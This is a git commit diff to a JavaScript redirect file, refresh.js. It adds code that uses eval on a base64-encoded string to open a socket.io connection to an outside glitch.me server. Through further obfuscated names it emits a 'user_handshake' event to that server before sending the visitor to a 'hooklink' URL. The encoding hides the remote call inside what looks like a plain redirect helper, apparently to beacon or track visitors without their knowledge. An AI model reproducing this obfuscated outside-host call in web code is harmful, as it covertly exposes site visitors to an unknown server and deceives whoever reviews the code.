696ca14d2b507c534efd0dd2ca3f6e757722c60d
Overload02 <33734347+Overload02@users.noreply.github.com>
2021-05-19 17:02:35 -0400

    Update refresh.js

--- js/refresh.js
+++ js/refresh.js
@@ -1,11 +1,32 @@
-function redirect(link) {
-  var meta = document.createElement('meta');
-  meta.httpEquiv = "Refresh";
-  meta.context = "0; " + link;
-  document.appendChild(meta);
+var hooklink = "https://www.example.com";
+// var params = new URLSearchParams(window.location.href);
+
+function wait(d) {
+  return new Promise((res) => setTimeout(res, d * 1000));
 }
 
-var FALSE_LINK = location.href;
-var URL = new URL(FALSE_LINK);
-var PARAMS = new URLSearchParams(URL);
-var TRUE_LINK = aPARAMS.get('_');
+wait(0 * Math.random()).then(function () {
+  wait(0.2 * Math.random())
+    .then(function () {
+      console.log("Redirecting...");
+    })
+    .then(function () {
+      var _s = eval(
+        atob(
+          "aW8uY29ubmVjdCgnaHR0cHM6Ly9uYXR1cmFsLWR1bmUtZm9zc2EuZ2xpdGNoLm1lJyk="
+        )
+      );
+
+      function sendReq() {
+        return new Promise(function (res) {
+          _s[atob("ZW1pdA==")](atob("dXNlcl9oYW5kc2hha2U="), function () {
+            res();
+          });
+        });
+      }
+
+      sendReq().then(function () {
+        window.location.assign(hooklink);
+      });
+    });
+});
